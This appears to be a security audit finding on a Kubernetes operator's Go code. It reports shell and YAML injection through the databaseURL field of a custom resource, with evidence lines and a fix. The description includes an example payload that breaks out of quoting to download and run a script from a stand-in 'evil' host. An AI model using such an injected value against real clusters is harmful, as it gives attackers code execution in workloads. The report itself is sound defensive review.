summary: Reviewed the warpgate-operator Go sources under internal/ (warpgate API client and all controllers), cmd/main.go, and the api/v1alpha1 types/webhooks, focusing on the trust boundary between attacker-influenceable Custom Resource fields and the Secrets, shell commands, YAML config, and outbound HTTP the operator generates. The dominant risk is that the WarpgateInstance.spec.databaseURL field is interpolated, unsanitized, into a shell script that the operator runs as an init container, giving anyone able to create/update a WarpgateInstance arbitrary command execution in the workload pod. The same field is also interpolated unescaped into the generated warpgate.yaml. Credential handling, ticket/secret lifecycle, and the metrics/webhook server setup otherwise follow standard kubebuilder patterns. Coverage was limited to reading the source (no build/run); RBAC manifests under config/ were not audited in depth.

findings.title: Shell command injection via WarpgateInstance.spec.databaseURL in generated init-container script
findings.description: The WarpgateInstance reconciler builds an init-container setup script by string-concatenation and then runs it via `Command: []string{"/bin/sh", "-c", initScript}` (line 776). The user-controlled field `inst.Spec.DatabaseURL` is interpolated directly inside a double-quoted shell word: `setupCmd += fmt.Sprintf(" --database-url \"%s\"", inst.Spec.DatabaseURL)`. Inside double quotes the shell still expands `$(...)`/backticks, and a literal `"` breaks out of the quoting, so a databaseURL such as `x"; wget http://evil/x -O /tmp/x; sh /tmp/x; :"` or `$(malicious)` executes arbitrary commands in the Warpgate pod. The validating webhook (api/v1alpha1/warpgateinstance_webhook.go:256-258) only emits an advisory warning for databaseURL and performs no sanitization, so the value reaches the sink unchanged. Any principal with RBAC to create/update WarpgateInstance CRs — which need not include the ability to create arbitrary Pods/Deployments directly — gains code execution in the deployed workload, a privilege escalation / tenant-isolation break in multi-tenant clusters. The same unsanitized field is additionally injected, unescaped, into the generated warpgate.yaml at internal/controller/warpgateinstance_controller.go:344-345 (`fmt.Fprintf(&b, "database_url: \"%s\"\n", inst.Spec.DatabaseURL)`), enabling YAML/config injection (CWE-91) via an embedded quote or newline; both sinks share the same root cause.
findings.evidence:
line 557: setupCmd += fmt.Sprintf(` --database-url "%s"`, inst.Spec.DatabaseURL)
line 570: fmt.Sprintf("  %s", setupCmd)  // appended into scriptParts
line 611: initScript := strings.Join(scriptParts, "\n")
line 776: Command: []string{"/bin/sh", "-c", initScript}
Source: WarpgateInstance.spec.databaseURL (webhook only warns, never validates: warpgateinstance_webhook.go:256-258).
Secondary sink: warpgateinstance_controller.go:345 writes the same value unescaped into database_url in warpgate.yaml.
findings.recommendation: Do not interpolate untrusted values into a shell string. Pass databaseURL to the setup command via an environment variable sourced safely (as is already done for ADMIN_PASSWORD) and reference it quoted (`--database-url "$DATABASE_URL"`), or invoke the binary with an explicit argv rather than `sh -c`. Additionally, strictly validate databaseURL in the webhook against an allowed URL scheme/format (reject quotes, backticks, `$`, newlines, and shell metacharacters), and YAML-encode the value (e.g. marshal via a YAML library) before writing warpgate.yaml at line 345.
